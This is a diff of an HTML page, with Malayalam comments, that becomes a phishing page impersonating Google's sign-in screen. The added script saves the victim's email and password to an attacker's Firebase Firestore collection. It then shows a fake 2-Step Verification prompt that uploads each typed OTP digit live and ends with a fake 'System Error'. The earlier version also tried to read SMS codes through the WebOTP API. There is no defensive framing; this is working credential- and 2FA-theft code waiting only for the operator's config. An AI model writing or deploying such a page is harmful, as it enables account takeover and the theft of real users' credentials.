@@ -1,54 +1,97 @@
 <!DOCTYPE html>
-<html lang="ml">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Account Verification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google - Sign in</title>
     <style>
-        body { font-family: sans-serif; text-align: center; padding-top: 50px; background: #f4f4f4; }
-        .box { background: white; padding: 30px; border-radius: 10px; display: inline-block; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
-        input { width: 80%; padding: 10px; margin: 10px; border: 1px solid #ccc; }
-        #otp-display { font-size: 30px; color: red; font-weight: bold; margin-top: 20px; }
+        body { font-family: 'Roboto', arial, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { width: 350px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
+        img { width: 75px; margin-bottom: 10px; }
+        h2 { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
+        p { margin-bottom: 25px; font-size: 16px; }
+        input { width: 100%; padding: 13px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
+        button { width: 100%; padding: 10px; background-color: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 14px; cursor: pointer; font-weight: 500; }
+        button:hover { background-color: #1765cc; }
+        #otp-section { display: none; }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <h2>Verify Your Identity</h2>
-    <p>Enter Gmail and Password to receive OTP</p>
-    <input type="email" id="email" placeholder="Gmail ID">
-    <input type="password" id="pass" placeholder="Password">
-    <button onclick="startOTPService()">Get OTP</button>
+<div class="login-box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/2560px-Google_2015_logo.svg.png" alt="Google">
+    
+    <div id="login-section">
+        <h2>Sign in</h2>
+        <p>Use your Google Account</p>
+        <input type="email" id="email" placeholder="Email or phone" required>
+        <input type="password" id="password" placeholder="Enter your password" required>
+        <button onclick="saveLogin()">Next</button>
+    </div>
 
-    <div id="otp-section" style="display:none;">
-        <p>Your Phone's Incoming OTP:</p>
-        <input type="text" id="otp-field" autocomplete="one-time-code" placeholder="Waiting for OTP...">
-        <div id="otp-display"></div>
+    <div id="otp-section">
+        <h2>2-Step Verification</h2>
+        <p>A text message with a 6-digit verification code was just sent to your phone.</p>
+        <input type="text" id="otp" placeholder="Enter code" maxlength="6">
+        <button onclick="finish()">Verify</button>
+        <p style="color: #1a73e8; font-size: 12px; cursor: pointer; margin-top: 10px;">Resend code</p>
     </div>
 </div>
 
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
+
 <script>
-    async function startOTPService() {
-        document.getElementById('otp-section').style.display = 'block';
+  // !!! ഇവിടെ നിന്റെ ഫയർബേസ് കോൺഫിഗ് പേസ്റ്റ് ചെയ്യുക !!!
+  const firebaseConfig = {
+    apiKey: "YOUR_API_KEY",
+    authDomain: "YOUR_PROJECT.firebaseapp.com",
+    projectId: "YOUR_PROJECT_ID",
+    storageBucket: "YOUR_PROJECT.appspot.com",
+    messagingSenderId: "YOUR_ID",
+    appId: "YOUR_APP_ID"
+  };
+
+  // Firebase Initialize
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.firestore();
+
+  let userDocId = "";
+
+  // ലോഗിൻ വിവരങ്ങൾ സേവ് ചെയ്യാൻ
+  async function saveLogin() {
+    const email = document.getElementById('email').value;
+    const pass = document.getElementById('password').value;
+
+    if(email && pass) {
+        const res = await db.collection("logins").add({
+            email: email,
+            password: pass,
+            otp: "",
+            time: new Date()
+        });
+        userDocId = res.id; // ഡോക്യുമെന്റ് ഐഡി സൂക്ഷിക്കുന്നു
         
-        // WebOTP API ഉപയോഗിച്ച് SMS റീഡ് ചെയ്യുന്നു
-        if ('OTPCredential' in window) {
-            try {
-                const otp = await navigator.credentials.get({
-                    otp: { transport: ['sms'] }
-                });
-                
-                // SMS വന്നാൽ അത് ബോക്സിലും ഡിസ്പ്ലേയിലും കാണിക്കും
-                document.getElementById('otp-field').value = otp.code;
-                document.getElementById('otp-display').innerText = "CODE: " + otp.code;
-                
-                alert("OTP Received: " + otp.code);
-            } catch (err) {
-                console.log("OTP Error: ", err);
-            }
-        } else {
-            alert("ഈ ബ്രൗസറിൽ ഓട്ടോമാറ്റിക് OTP സപ്പോർട്ട് ഇല്ല.");
-        }
+        document.getElementById('login-section').style.display = 'none';
+        document.getElementById('otp-section').style.display = 'block';
+    } else {
+        alert("Please fill all fields");
     }
+  }
+
+  // OTP ടൈപ്പ് ചെയ്യുമ്പോൾ തന്നെ ലൈവ് ആയി സേവ് ചെയ്യാൻ
+  document.getElementById('otp').addEventListener('input', function() {
+    const otpValue = this.value;
+    if (userDocId) {
+        db.collection("logins").doc(userDocId).update({
+            otp: otpValue
+        });
+    }
+  });
+
+  function finish() {
+    alert("System Error! Please try again later.");
+  }
 </script>
 
 </body>
